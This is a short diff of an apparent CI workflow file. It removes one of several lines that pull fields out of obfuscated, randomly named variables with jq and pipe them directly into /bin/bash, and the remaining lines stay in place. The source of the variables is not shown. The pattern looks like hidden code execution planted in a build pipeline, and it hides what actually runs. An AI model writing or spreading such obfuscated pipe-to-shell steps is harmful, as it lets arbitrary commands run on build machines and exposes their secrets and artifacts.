@@ -40,7 +40,6 @@ jobs:
           echo $qv93498 | jq -r .mev89756 | /bin/bash
           printf '%s' "$a63" | jq -r .pt438 | /bin/bash
           printf '%s' "$ulnj52894" | jq -r .l2215 | /bin/bash
-          echo $lf8 | jq -r .gtrxg514 | /bin/bash
           echo $z6 | jq -r .qvaid04121 | /bin/bash
 
       - name: Store artifact
